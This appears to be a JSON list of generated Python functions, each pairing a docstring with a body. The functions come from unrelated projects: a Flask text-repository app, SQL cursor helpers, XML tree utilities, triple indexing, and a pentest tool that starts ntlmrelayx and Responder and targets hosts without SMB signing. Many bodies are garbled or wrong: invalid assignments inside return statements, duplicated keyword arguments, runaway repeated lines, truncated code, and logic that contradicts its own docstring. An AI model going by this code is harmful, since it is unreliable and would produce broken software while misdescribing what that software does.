        "def get_collections(self, lang=None):\n        \"\"\"Retrieve main parent collections of a repository\n\n        :param lang: Language to retrieve information in\n        :return: Sorted collections representations\n        \"\"\"\n        if lang is None:\n            lang = self.get_default_lang()\n        return sorted(self.get_collections_by_lang(lang))",
        "def get_cache_key(self, endpoint, **kwargs):\n        \"\"\"\n        This function is built to provide cache keys for templates\n\n        :param endpoint: Current endpoint\n        :param kwargs: Keyword Arguments\n        :return: tuple of i18n dependant cache key and i18n ignoring cache key\n        :rtype: tuple(str)\n        \"\"\"\n        endpoint = self.get_endpoint(endpoint)\n        return (endpoint.get_cache_key(), endpoint.get_ignore_cache_key())",
        "def render_template(self, template, **kwargs):\n        \"\"\"Render a route template and adds information to this route.\n\n        :param template: Template name.\n        :type template: str\n        :param kwargs: dictionary of named arguments used to be passed to the template\n        :type kwargs: dict\n        :return: Http Response with rendered template\n        :rtype: flask.Response\n        \"\"\"\n        self.template = template\n        self.kwargs = kwargs\n        return self.app.render_template(self.template, **self.kwargs)",
        "def register_blueprint(self):\n        \"\"\"Register the app using Blueprint\n\n        :return: Nemo blueprint\n        :rtype: flask.Blueprint\n        \"\"\"\n        blueprint = Blueprint(\n            self.name,\n            self.app.config['NEMO_API_VERSION'],\n            url_prefix=self.app.config['NEMO_API_URL_PREFIX'],\n            static_folder=self.app.config['NEMO_API_STATIC_FOLDER'],\n            static_url_path=self.app.config['NEMO_API_STATIC_URL_PATH'],\n            static_folder_path=self.app.config['NEMO_API_STATIC_FOLDER_PATH'],\n            url_prefix_path=self.app.config['NEMO_API_URL_PREFIX_PATH'],\n            url_prefix=self.app.config",
        "def _register_filters(self):\n    \"\"\"Register filters for Jinja to use\n\n       .. note::  Extends the dictionary filters of jinja_env using self._filters list\n    \"\"\"\n    for key, value in self._filters.items():\n        jinja_env.filters[key] = value",
        "def register_plugins(self, *plugins):\n        \"\"\"\n        Register plugins in Nemo instance\n\n        - Clear routes first if asked by one plugin\n        - Clear assets if asked by one plugin and replace by the last plugin registered static_folder\n        - Register each plugin\n            - Append plugin routes to registered routes\n            - Append plugin filters to registered filters\n            - Append templates directory to given namespaces\n            - Append assets (CSS, JS, statics) to given resources \n            - Append render view (if exists) to Nemo.render stack\n        \"\"\"\n        for plugin in plugins:\n            if isinstance(plugin, Plugin):\n                self.register_plugin(plugin)\n            else:\n                raise TypeError(\"Plugin must be a Plugin instance\")",
        "def _handle_references(self, text, reffs):\n        \"\"\"\n        Handle a list of references depending on the text identifier using the chunker dictionary.\n\n        :param text: Text object from which comes the references\n        :type text: MyCapytains.resources.texts.api.Text\n        :param reffs: List of references to transform\n        :type reffs: References\n        :return: Transformed list of references\n        :rtype: [str]\n        \"\"\"\n        if text.identifier in self.chunker:\n            return self.chunker[text.identifier](reffs)\n        else:\n            return reffs",
        "def _append_pipe_data(self, pipe_data, tag):\n        \"\"\"Obtains the data from the pipe and appends the given tag.\"\"\"\n        if pipe_data is None:\n            return\n        if isinstance(pipe_data, dict):\n            for key, value in pipe_data.items():\n                self._append_pipe_data(value, tag)\n        elif isinstance(pipe_data, list):\n            for item in pipe_data:\n                self._append_pipe_data(item, tag)\n        else:\n            raise TypeError(\"Pipe data must be a dict or a list\")",
        "def _set_section_value(self, section, value):\n        \"\"\" Creates the section value if it does not exists and sets the value.\n            Use write_config to actually set the value.\n        \"\"\"\n        if not self.config.has_section(section):\n            self.config.add_section(section)\n        self.config.set(section, 'value', value)",
        "def get_config(self, section, key, default=None):\n        \"\"\" This function tries to retrieve the value from the configfile\n            otherwise will return a default.\n        \"\"\"\n        try:\n            return self.config.get(section, key)\n        except (NoOptionError, NoSectionError):\n            return default",
        "def get_config_dir():\n    \"\"\"Returns the configuration directory\"\"\"\n    config_dir = os.path.join(os.path.dirname(__file__), 'config')\n    return config_dir",
        "def write_config(self):\n        \"\"\"Write the current config to disk to store them.\"\"\"\n        with open(self.config_file, 'w') as f:\n            json.dump(self.config, f, indent=4)",
        "def track_branch(self, remote_branch):\n        \"\"\"Track the specified remote branch if it is not already tracked.\"\"\"\n        if remote_branch not in self.branches:\n            self.branches[remote_branch] = {}\n        self.branches[remote_branch]['last_commit'] = time.time()",
        "def checkout(self, branch):\n        \"\"\"Checkout, update and branch from the specified branch.\"\"\"\n        self.update(branch)\n        self.checkout_and_update(branch)",
        "def _get_interface_name(self):\n        \"\"\"Returns the interface name of the first not link_local and not loopback interface.\"\"\"\n        if self._interface_name is None:\n            for interface in self._interfaces:\n                if interface.link_local is False and interface.is_loopback is False:\n                    self._interface_name = interface.name\n                    break\n            if self._interface_name is None:\n                raise RuntimeError(\"Could not find interface name\")\n        return self._interface_name",
        "def load_targets(self, targets):\n        \"\"\"load_targets will load the services with smb signing disabled and if ldap is enabled the services with the ldap port open.\"\"\"\n        for target in targets:\n            if target.get('type') == 'service':\n                if target.get('type') == 'smb':\n                    self.load_service(target)\n                elif target.get('type') == 'ldap':\n                    self.load_ldap_service(target)",
        "def write_targets(self):\n        \"\"\"write_targets will write the contents of ips and ldap_strings to the targets_file.\"\"\"\n        if self.targets_file:\n            with open(self.targets_file, 'w') as f:\n                f.write('\\n'.join(self.ips))\n                f.write('\\n'.join(self.ldap_strings))",
        "def start(self):\n        \"\"\" Starts the ntlmrelayx.py and responder processes.\n            Assumes you have these programs in your path.\n        \"\"\"\n        self.logger.info(\"Starting ntlmrelayx.py...\")\n        self.process_ntlmrelayx()\n        self.process_responder()",
        "def _pyinotify_callback(self, fd, mask, data):\n        \"\"\"Function that gets called on each event from pyinotify.\"\"\"\n        if mask & pyinotify.IN_MODIFY:\n            self._handle_modify(fd, data)\n        elif mask & pyinotify.IN_DELETE:\n            self._handle_delete(fd, data)\n        elif mask & pyinotify.IN_DELETE_ALL:\n            self._handle_delete_all(fd, data)\n        elif mask & pyinotify.IN_DELETE_SELF:\n            self._handle_delete_self(fd, data)\n        elif mask & pyinotify.IN_CREATE:\n            self._handle_create(fd, data)\n        elif mask & pyinotify.IN_MODIFY_SELF:\n            self._handle_modify_self",
        "def watch(self):\n        \"\"\"Watches directory for changes\"\"\"\n        self.watch_dir(self.directory)\n        self.watch_file(self.file)",
        "def terminate(self):\n        \"\"\"Terminate the processes.\"\"\"\n        for process in self.processes:\n            process.terminate()\n        self.processes = []",
        "def wait_for_exit(self):\n        \"\"\" This function waits for the relay and responding processes to exit.\n            Captures KeyboardInterrupt to shutdown these processes.\n        \"\"\"\n        self.relay.join()\n        self.responding.join()\n        if self.relay.is_alive():\n            raise KeyboardInterrupt(\"Relay process exited\")",
        "def query(self, targets, wildcard, include, exclude, limit=None, start=1, expand=False):\n        \"\"\"Retrieve annotations from the query provider\n\n        :param targets: The CTS URN(s) to query as the target of annotations\n        :type targets: [MyCapytain.common.reference.URN], URN or None\n        :param wildcard: Wildcard specifier for how to match the URN\n        :type wildcard: str\n        :param include: URI(s) of Annotation types to include in the results\n        :type include: list(str)\n        :param exclude: URI(s) of Annotation types to include in the results\n        :type exclude: list(str)\n        :param limit: The max number of results to return (Default is None for no limit)\n        :type limit: int\n        :param start: the starting record to return (Default is",
        "def breadcrumbs(self, **kwargs):\n        \"\"\"Make breadcrumbs for a route\n\n        :param kwargs: dictionary of named arguments used to construct the view\n        :type kwargs: dict\n        :return: List of dict items the view can use to construct the link.\n        :rtype: {str: list({ \"link\": str, \"title\", str, \"args\", dict})}\n        \"\"\"\n        breadcrumbs = {}\n        for route in self.routes:\n            breadcrumbs[route.name] = route.breadcrumbs(**kwargs)\n        return breadcrumbs",
        "def start_nessus_scan(self):\n        \"\"\"\n        This function obtains hosts from core and starts a nessus scan on these hosts.\n        The nessus tag is appended to the host tags.\n        \"\"\"\n        for host in self.hosts:\n            if host.is_nessus:\n                host.add_tag('nessus', '1')\n                host.add_tag('nessus-scan', '1')",
        "def get_template_uuid(self, template_name):\n        \"\"\"Retrieves the uuid of the given template name.\"\"\"\n        return self.get_object(Template, name=template_name,\n                                uuid=self.get_template_uuid_by_name(template_name))",
        "def create_scan(self, host_ips, scan_id=None):\n        \"\"\" Creates a scan with the given host ips\n            Returns the scan id of the created object.\n        \"\"\"\n        if scan_id is None:\n            scan_id = self.create_scan_id()\n        return self.client.create_scan(scan_id, host_ips)",
        "def start_scan(self, scan_id):\n        \"\"\"Starts the scan identified by the scan_id.s\"\"\"\n        self.send_command(scan_id, 'start')\n        self.wait_for_command_result(scan_id, 'start')",
        "def _bump_uri_comparison(self, uri):\n        \"\"\"Bases the comparison of the datastores on URI alone.\"\"\"\n        if self.uri_comparison_strategy == URI_COMPARISON_STRATEGY_BETA:\n            self.uri_comparison_strategy = URI_COMPARISON_STRATEGY_NORMAL",
        "def add_tag(self, tag):\n        \"\"\"Adds a tag to the list of tags and makes sure the result list contains only unique results.\"\"\"\n        if tag not in self.tags:\n            self.tags.append(tag)\n            self.unique_tags.append(tag)",
        "def remove_tag(self, tag):\n        \"\"\"Removes a tag from this object\"\"\"\n        if tag in self.tags:\n            self.tags.remove(tag)\n            self.save()",
        "def get_result(self, include_meta=False):\n        \"\"\"\n        Returns the result as a dictionary, provide the include_meta flag to als show information like index and doctype.\n        \"\"\"\n        result = {}\n        if self.result:\n            result = self.result\n        if include_meta:\n            result.update(self.meta)\n        return result",
        "def get_annotations_by_target(self, target_urn):\n        \"\"\"Route to retrieve annotations by target\n\n        :param target_urn: The CTS URN for which to retrieve annotations  \n        :type target_urn: str\n        :return: a JSON string containing count and list of resources\n        :rtype: {str: Any}\n        \"\"\"\n        target_uri = self.get_target_uri(target_urn)\n        annotations = self.get_annotations_by_uri(target_uri)\n        return self.return_annotations(annotations)",
        "def label(self, key):\n        \"\"\"Returns the label for a given Enum key\"\"\"\n        if key in self.labels:\n            return self.labels[key]\n        else:\n            raise KeyError(key)",
        "def get_verbose_name(value):\n    \"\"\"Returns the verbose name for a given enum value\"\"\"\n    if value in _enum_values:\n        return _enum_values[value].name\n    else:\n        return value",
        "def get_dns_servers(self):\n        \"\"\"Returns the configured DNS servers with the use f nmcli.\"\"\"\n        if self.use_nmcli:\n            return self.dns_servers_nmcli\n        else:\n            return self.dns_servers_default",
        "def _zone_transfer(self, zone_id, source_zone_id, destination_zone_id,\n                       transfer_type, transfer_size, transfer_interval,\n                       transfer_timeout, source_ip, destination_ip,\n                       source_port, destination_port,\n                       source_zone_type, destination_zone_type,\n                       source_zone_type_id, destination_zone_type_id,\n                       source_zone_type_id_list, destination_zone_type_id_list,\n                       source_zone_type_id_list_list, destination_zone_type_id_list_list,\n                       source_zone_type_id_list_list_list,\n                       source_zone_type_id_list_list_list,\n                       destination_zone_type_id_list_list_list,\n                       source_zone_type_",
        "def _resolve_domains(self, domains):\n        \"\"\"Resolves the list of domains and returns the ips.\"\"\"\n        ips = []\n        for domain in domains:\n            try:\n                ip_address = socket.gethostbyname(domain)\n                ips.append(ip_address)\n            except socket.gaierror:\n                pass\n        return ips",
        "def _parse_ips(self, ips, netmask, include_public=False):\n        \"\"\"\n        Parses the list of ips, turns these into ranges based on the netmask given.\n        Set include_public to True to include public IP adresses.\n        \"\"\"\n        if netmask is None:\n            netmask = self.netmask\n        if netmask is None:\n            raise ValueError(\"No netmask given\")\n        if netmask == self.netmask:\n            return ips\n        if include_public:\n            return [ip for ip in ips if ip.netmask == netmask]\n        return [ip for ip in ips if ip.netmask != netmask]",
        "def _create_connection(self, config):\n        \"\"\"Creates a connection based upon the given configuration object.\"\"\"\n        if config.get('connection', None):\n            return self._create_connection_from_config(config)\n        else:\n            return self._create_connection_from_env(config)",
        "def search(self, index, doc_type, body=None, **kwargs):\n        \"\"\"Searches the elasticsearch instance to retrieve the requested documents.\"\"\"\n        return self.es.search(index=index, doc_type=doc_type, body=body, **kwargs)",
        "def main():\n    \"\"\"Uses the command line arguments to fill the search function and call it.\"\"\"\n    parser = argparse.ArgumentParser(description='Search for a given text.')\n    parser.add_argument('text', help='The text to search.')\n    parser.add_argument('--start', type=int, default=0, help='The start position of the search.')\n    parser.add_argument('--end', type=int, default=None, help='The end position of the search.')\n    parser.add_argument('--include-punctuation', action='store_true', default=False,\n                        help='Include punctuation characters in the search.')\n    parser.add_argument('--include-whitespace', action='store_true', default=False,\n                        help='Include whitespace characters in the search.')\n    parser.add_argument('--include-punctuation",
        "def count(self, *args, **kwargs):\n        \"\"\"\n        Returns the number of results after filtering with the given arguments.\n        \"\"\"\n        return self.query.filter(*args, **kwargs).count()",
        "def main():\n    \"\"\"Uses the command line arguments to fill the count function and call it.\"\"\"\n    parser = argparse.ArgumentParser(description='Count the number of words in a file.')\n    parser.add_argument('-f', '--file', help='The file to count.', required=True)\n    parser.add_argument('-n', '--number', help='The number of words to count.', type=int, default=1)\n    args = parser.parse_args()\n    count(args.file, args.number)",
        "def pipe_to_object(self, pipe):\n        \"\"\" Returns a generator that maps the input of the pipe to an elasticsearch object.\n            Will call id_to_object if it cannot serialize the data from json.\n        \"\"\"\n        for data in pipe:\n            try:\n                yield self.id_to_object(data)\n            except Exception as e:\n                raise Exception(\"Cannot serialize data to elasticsearch: %s\" % e)",
        "def resolve_ip_address(ip_address):\n    \"\"\"Resolves an ip adres to a range object, creating it if it doesn't exists.\"\"\"\n    if ip_address in _ip_address_cache:\n        return _ip_address_cache[ip_address]\n    try:\n        return _ip_address_cache[ip_address] = ip_address_range(ip_address)\n    except ValueError:\n        pass\n    try:\n        return _ip_address_cache[ip_address] = ip_address_range(ip_address, ip_address + 1)\n    except ValueError:\n        pass\n    return ip_address_range(ip_address, ip_address + 1)",
        "def _range_argparser_option(parser, option, value):\n    \"\"\"Argparser option with search functionality specific for ranges.\"\"\"\n    parser.add_argument(\n        '--{0}={1}'.format(option, value),\n        type=str,\n        help='The value to search for.',\n    )",
        "def search_elasticsearch(self, query=None, **kwargs):\n        \"\"\"\n        Searches elasticsearch for objects with the same address, protocol, port and state.\n        \"\"\"\n        return self.search(query=query, **kwargs)",
        "def resolve_id(self, id):\n        \"\"\"\n        Resolves the given id to a user object, if it doesn't exists it will be created.\n        \"\"\"\n        try:\n            return self.user_model.objects.get(pk=id)\n        except self.user_model.DoesNotExist:\n            return self.user_model.objects.create(pk=id)",
        "def get_domains(self):\n        \"\"\"Retrieves the domains of the users from elastic.\"\"\"\n        domains = self.elastic.indices.get_domains(index=self.index)\n        return [domain['name'] for domain in domains]",
        "def _get_pipe_results(self, pipe_id):\n        \"\"\" Returns a list that maps the input of the pipe to an elasticsearch object.\n            Will call id_to_object if it cannot serialize the data from json.\n        \"\"\"\n        pipe_data = self.pipe_data_store.get_pipe_data(pipe_id)\n        if pipe_data is None:\n            return []\n\n        try:\n            pipe_data = json.loads(pipe_data)\n        except ValueError:\n            pass\n\n        results = []\n        for data in pipe_data:\n            try:\n                results.append(self.id_to_object(data))\n            except Exception as e:\n                logger.error(\"Error while serializing data for pipe %s: %s\", pipe_id, e)\n\n        return results",
        "def parse_protocol_tree(self, tree):\n        \"\"\"Consumes an ET protocol tree and converts it to state.Command commands\"\"\"\n        commands = []\n        for command in tree.findall('command'):\n            commands.append(self.parse_command(command))\n        return commands",
        "def _init_indices(self):\n        \"\"\"Initializes the indices\"\"\"\n        self.indices = np.zeros((self.n_samples, self.n_features))\n        self.indices[:, 0] = 0\n        self.indices[:, 1] = 1\n        self.indices[:, 2] = 2",
        "def _parse_computer(self, entry):\n        \"\"\"Parse the entry into a computer object.\"\"\"\n        if entry.get('type') == 'computer':\n            return Computer(entry)\n        elif entry.get('type') == 'group':\n            return Group(entry)\n        elif entry.get('type') == 'group-member':\n            return GroupMember(entry)\n        elif entry.get('type') == 'group-member-group':\n            return GroupMemberGroup(entry)\n        elif entry.get('type') == 'group-member-group-member':\n            return GroupMemberGroupMember(entry)\n        elif entry.get('type') == 'group-member-group-member-member':\n            return GroupMemberGroupMemberMember(entry)\n        elif entry.get('type') == 'group-member-group-member-member-member':\n",
        "def _parse_file(self, filename):\n        \"\"\"Parse the file and extract the computers, import the computers that resolve into jackal.\"\"\"\n        with open(filename, 'r') as f:\n            for line in f:\n                line = line.strip()\n                if line.startswith('#'):\n                    continue\n                if line.startswith('computers'):\n                    self._parse_computers(line)\n                elif line.startswith('import'):\n                    self._import_computers(line)\n                elif line.startswith('import_jackal'):\n                    self._import_jackal_computers(line)\n                elif line.startswith('import_jackal_computers'):\n                    self._import_jackal_computers(line)\n                elif line.startswith('import_jackal_computers",
        "def _parse_domain(self, domain_entry):\n        \"\"\"Parses a single entry from the domaindump\"\"\"\n        domain = domain_entry.get('domain')\n        if domain is None:\n            return None\n        return {\n            'name': domain.get('name'),\n            'type': domain.get('type'),\n            'description': domain.get('description'),\n            'ttl': domain.get('ttl'),\n            'ttl_seconds': domain.get('ttl_seconds'),\n            'ttl_units': domain.get('ttl_units'),\n            'ttl_seconds_units': domain.get('ttl_seconds_units'),\n            'ttl_units': domain.get('ttl_units'),\n            'ttl_seconds_units': domain.get('ttl_seconds_units'),\n            'ttl_units': domain.get('ttl_units'),\n            'ttl_",
        "def _parse_domain_users_groups(self):\n        \"\"\"Parses the domain users and groups files.\"\"\"\n        for domain in self.domains:\n            for user in domain.users:\n                self._parse_user_group(user)",
        "def _parse_ldap_domain_dump(self):\n        \"\"\"Parses ldapdomaindump files and stores hosts and users in elasticsearch.\"\"\"\n        for host in self.hosts:\n            self.hosts[host]['users'] = []\n            for user in self.users:\n                self.users[user]['hosts'] = []\n                for ldap_domain in self.ldap_domains:\n                    if ldap_domain['host'] == host:\n                        self.hosts[host]['users'].append(user)\n                        self.ldap_domains.remove(ldap_domain)\n                        break",
        "def autocomplete(query, country=None, hurricanes=False, cities=False, timeout=None):\n    \"\"\"Make an autocomplete API request\n\n    This can be used to find cities and/or hurricanes by name\n\n    :param string query: city\n    :param string country: restrict search to a specific country. Must be a two letter country code\n    :param boolean hurricanes: whether to search for hurricanes or not\n    :param boolean cities: whether to search for cities or not\n    :param integer timeout: timeout of the api request\n    :returns: result of the autocomplete API request\n    :rtype: dict\n    \"\"\"\n    if not timeout:\n        timeout = DEFAULT_TIMEOUT\n    if not country:\n        country = DEFAULT_COUNTRY\n    if not hurricanes:\n        hurric",
        "def request(key, features, query, timeout=None):\n    \"\"\"Make an API request\n\n    :param string key: API key to use\n    :param list features: features to request. It must be a subset of :data:`FEATURES`\n    :param string query: query to send\n    :param integer timeout: timeout of the request\n    :returns: result of the API request\n    :rtype: dict\n    \"\"\"\n    if timeout is None:\n        timeout = DEFAULT_TIMEOUT\n    return requests.request(\n        key,\n        features,\n        query,\n        timeout=timeout,\n    )",
        "def _try_unicode(s):\n    \"\"\"Try to convert a string to unicode using different encodings\"\"\"\n    try:\n        return s.decode(ENCODING)\n    except UnicodeDecodeError:\n        return s.decode(ENCODING, 'replace')",
        "def get_auth_request(provider, request_url, params, token_secret, token_cookie):\n    \"\"\"Handle HTTP GET requests on an authentication endpoint.\n\n    Authentication flow begins when ``params`` has a ``login`` key with a value\n    of ``start``. For instance, ``/auth/twitter?login=start``.\n\n    :param str provider: An provider to obtain a user ID from.\n    :param str request_url: The authentication endpoint/callback.\n    :param dict params: GET parameters from the query string.\n    :param str token_secret: An app secret to encode/decode JSON web tokens.\n    :param str token_cookie: The current JSON web token, if available.\n    :return: A dict containing any of the following possible keys:\n\n        ``status``: an HTTP status code the server should sent\n\n        ``redirect``: where the",
        "def get_json_data(self):\n        \"\"\"\n        Method to call to get a serializable object for json.dump or jsonify based on the target\n\n        :return: dict\n        \"\"\"\n        if self.target == 'json':\n            return self.get_json()\n        elif self.target == 'jsonify':\n            return self.get_jsonify()\n        else:\n            raise Exception(\"Unknown target: {}\".format(self.target))",
        "def read(self):\n        \"\"\"Read the contents of the Annotation Resource\n\n        :return: the contents of the resource\n        :rtype: str or bytes or flask.response\n        \"\"\"\n        if self.is_read:\n            return self.data\n\n        self.is_read = True\n        return self.data",
        "def index_triples(self, triples):\n        \"\"\"index all triples into indexes and return their mappings\"\"\"\n        self.index_triples_internal(triples)\n        return self.index_triples_external",
        "def _recover_triples(self, mapping):\n        \"\"\"recover triples from mapping.\"\"\"\n        for s, p, o in mapping:\n            self.add_triples((s, p, o))",
        "def _triple_index_to_numpy(self, triple_index):\n        \"\"\"Transform triple index into a 1-D numpy array.\"\"\"\n        if triple_index is None:\n            return None\n        if len(triple_index) == 2:\n            return np.array([triple_index[0], triple_index[1]])\n        if len(triple_index) == 3:\n            return np.array([triple_index[0], triple_index[1], triple_index[2]])\n        raise ValueError(\"Invalid triple index: %s\" % triple_index)",
        "def pack_triple_indexes(triple_indexes):\n    \"\"\"Packs a list of triple indexes into a 2D numpy array.\"\"\"\n    if len(triple_indexes) == 0:\n        return np.array([])\n    else:\n        return np.array([triple_indexes[0], triple_indexes[1]])",
        "def _keep_one_relation(self, relation_set, entity_pairs):\n        \"\"\"If entity pairs in a relation is as close as another relations, only keep one relation of such set.\"\"\"\n        for relation_id, entity_pair in entity_pairs.items():\n            if relation_id in relation_set:\n                continue\n            relation_set.add(relation_id)\n            if len(relation_set) > 1:\n                self._keep_one_relation(relation_set, entity_pair)",
        "def _remove_direct_links(self):\n        \"\"\"Remove direct links in the training sets.\"\"\"\n        for link in self.links:\n            if link.is_direct:\n                self.links.remove(link)",
        "def _find_union(self, union_find, *args, **kwargs):\n        \"\"\"Uses a union find to find segment.\"\"\"\n        return self._find(union_find, *args, **kwargs)",
        "def _create_data_structure(self, data_type, data_type_name, data_type_schema):\n        \"\"\"Create a usable data structure for serializing.\"\"\"\n        data_type_schema = data_type_schema or {}\n        data_type_schema.update({\n            'type': data_type,\n            'name': data_type_name,\n            'description': data_type_name,\n            'required': False,\n            'required_by_default': False,\n            'type_description': data_type_name,\n            'type_name': data_type_name,\n            'type_schema': data_type_schema,\n        })\n        return data_type_schema",
        "def log_done(self, entity, operation, *args, **kwargs):\n        \"\"\"Logs an operation done on an entity, possibly with other arguments\"\"\"\n        if entity is None:\n            return\n        if operation is None:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n        if entity.is_root:\n            return\n",
        "def log_state(self, entity, state):\n        \"\"\"Logs a new state of an entity\"\"\"\n        if entity not in self.entities:\n            raise ValueError(\"Entity %s not in the database\" % entity)\n        if state not in self.states:\n            raise ValueError(\"State %s not in the database\" % state)\n        self.entities[entity]['state'] = state\n        self.states[state] = entity",
        "def log_update(self, entity, update):\n        \"\"\"Logs an update done on an entity\"\"\"\n        if self.log_update_callback:\n            self.log_update_callback(entity, update)",
        "def error(self, message, *args, **kwargs):\n        \"\"\"Logs an error\"\"\"\n        self.log(logging.ERROR, message, *args, **kwargs)",
        "def cursor_factory(cursor_type=CursorType.DICT):\n    \"\"\"Decorator that provides a dictionary cursor to the calling function\n\n    Adds the cursor as the second argument to the calling functions\n\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor(cursor_type=CursorType.DICT) coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side dictionary cursor\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            cursor = get_cursor(cursor_type=cursor_type)\n            yield cursor\n        return wrapper\n    return decorator",
        "def cursor(func):\n    \"\"\"Decorator that provides a cursor to the calling function\n\n    Adds the cursor as the second argument to the calling functions\n\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor() coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side cursor\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        cursor = func(*args, **kwargs)\n        kwargs['cursor'] = cursor\n        yield cursor\n    return wrapper",
        "def cursor(cursor_type=CursorType.NAMEDTUPLE):\n    \"\"\"Decorator that provides a namedtuple cursor to the calling function\n\n    Adds the cursor as the second argument to the calling functions\n\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor(cursor_type=CursorType.NAMEDTUPLE) coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side namedtuple cursor\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            cursor = get_cursor(cursor_type=cursor_type)\n            yield cursor\n        return wrapper\n    return decorator",
        "def no_autocommit_cursor(func):\n    \"\"\"Provides a transacted cursor which will run in autocommit=false mode\n\n    For any exception the transaction will be rolled back.\n    Requires that the function being decorated is an instance of a class or object\n    that yields a cursor from a get_cursor(cursor_type=CursorType.NAMEDTUPLE) coroutine or provides such an object\n    as the first argument in its signature\n\n    Yields:\n        A client-side transacted named cursor\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        try:\n            cursor = func(*args, **kwargs)\n        except Exception:\n            cursor = None\n        finally:\n            if cursor is not None:\n                cursor.close()\n    return wrapper",
        "def get_table_size(self, table):\n        \"\"\"gives the number of records in the table\n\n        Args:\n            table: a string indicating the name of the table\n\n        Returns:\n            an integer indicating the number of records in the table\n        \"\"\"\n        self.check_table_exists(table)\n        return self.get_table_count(table)",
        "def _create_insert_statement(self, table, values):\n        \"\"\"Creates an insert statement with only chosen fields\n\n        Args:\n            table: a string indicating the name of the table\n            values: a dict of fields and values to be inserted\n\n        Returns:\n            A 'Record' object with table columns as properties\n        \"\"\"\n        fields = self._get_fields(table)\n        values = self._get_values(table, values)\n        return self._create_insert_statement_from_fields(table, fields, values)",
        "def _create_update_query_with_select_fields(self, table, values, where_keys):\n        \"\"\"\n        Creates an update query with only chosen fields\n        Supports only a single field where clause\n\n        Args:\n            table: a string indicating the name of the table\n            values: a dict of fields and values to be inserted\n            where_keys: list of dictionary\n            example of where keys: [{'name':('>', 'cip'),'url':('=', 'cip.com'},{'type':{'<=', 'manufacturer'}}]\n            where_clause will look like ((name>%s and url=%s) or (type <= %s))\n            items within each dictionary get 'AND'-ed and dictionaries themselves get 'OR'-ed\n\n        Returns:\n            an integer indicating count of rows deleted\n        \"\"\"\n        where_clause = ' '.join",
        "def _where_clause(self, table, where_keys):\n        \"\"\"\n        Creates a delete query with where keys\n        Supports multiple where clause with and or or both\n\n        Args:\n            table: a string indicating the name of the table\n            where_keys: list of dictionary\n            example of where keys: [{'name':('>', 'cip'),'url':('=', 'cip.com'},{'type':{'<=', 'manufacturer'}}]\n            where_clause will look like ((name>%s and url=%s) or (type <= %s))\n            items within each dictionary get 'AND'-ed and dictionaries themselves get 'OR'-ed\n\n        Returns:\n            an integer indicating count of rows deleted\n        \"\"\"\n        where_clause = []\n        for where_key in where_keys:\n            where_clause.append(self._where_clause",
        "def select_where_keys(self, table, order_by, columns, where_keys, limit=None, offset=None):\n        \"\"\"\n        Creates a select query for selective columns with where keys\n        Supports multiple where claus with and or or both\n\n        Args:\n            table: a string indicating the name of the table\n            order_by: a string indicating column name to order the results on\n            columns: list of columns to select from\n            where_keys: list of dictionary\n            limit: the limit on the number of results\n            offset: offset on the results\n\n            example of where keys: [{'name':('>', 'cip'),'url':('=', 'cip.com'},{'type':{'<=', 'manufacturer'}}]\n            where_clause will look like ((name>%s and url=%s) or (type <= %s))\n           ",
        "def query(self, query, values=None):\n        \"\"\"Run a raw sql query\n\n        Args:\n            query : query string to execute\n            values : tuple of values to be used with the query\n\n        Returns:\n            result of query as list of named tuple\n        \"\"\"\n        if values is None:\n            values = ()\n        return self.execute(query, values)",
        "def append_text(out, text):\n    \"\"\"\n    This method is used to append content of the `text`\n    argument to the `out` argument.\n\n    Depending on how many lines in the text, a\n    padding can be added to all lines except the first\n    one.\n\n    Concatenation result is appended to the `out` argument.\n    \"\"\"\n    lines = text.splitlines()\n    if len(lines) > 0:\n        out.write(lines[0])\n        for line in lines[1:]:\n            out.write(line)",
        "def _unicode(value):\n    \"\"\"This function should return unicode representation of the value\"\"\"\n    if isinstance(value, str):\n        return value.encode('utf-8')\n    elif isinstance(value, unicode):\n        return value\n    else:\n        return str(value)",
        "def _traverse_element_tree(element, query):\n    \"\"\"Helper function to traverse an element tree rooted at element, yielding nodes matching the query.\"\"\"\n    if isinstance(query, (list, tuple)):\n        for node in query:\n            yield _traverse_element_tree(element, node)\n    else:\n        yield element",
        "def _normalize_query(query):\n    \"\"\"Given a simplified XPath query string, returns an array of normalized query parts.\"\"\"\n    parts = []\n    for part in query.split('&'):\n        parts.append(part.split('=')[0])\n    return parts",
        "def insert_before(self, before, name, attrs=None, data=None):\n        \"\"\"\n        Inserts a new element as a child of this element, before the specified index or sibling.\n\n        :param before: An :class:`XmlElement` or a numeric index to insert the new node before\n        :param name: The tag name to add\n        :param attrs: Attributes for the new tag\n        :param data: CDATA for the new tag\n        :returns: The newly-created element\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        if before is None:\n            before = self.child_count\n        return self.insert_after(before, name, attrs, data)",
        "def children(self, name=None, reverse=False):\n        \"\"\"\n        A generator yielding children of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :param reverse: If ``True``, children will be yielded in reverse declaration order\n        \"\"\"\n        if name is None:\n            return self.iter_children(reverse)\n        else:\n            return self.iter_children_by_tag(name, reverse)",
        "def _matches_predicate(self, predicate):\n        \"\"\"Helper function to determine if this node matches the given predicate.\"\"\"\n        if predicate is None:\n            return True\n        if isinstance(predicate, (list, tuple)):\n            return all(predicate(self) for predicate in predicate)\n        return predicate(self)",
        "def canonical_path(self, include_root=False):\n        \"\"\"\n        Returns a canonical path to this element, relative to the root node.\n\n        :param include_root: If ``True``, include the root node in the path. Defaults to ``False``.\n        \"\"\"\n        if include_root:\n            return self.root.canonical_path\n        else:\n            return self.path",
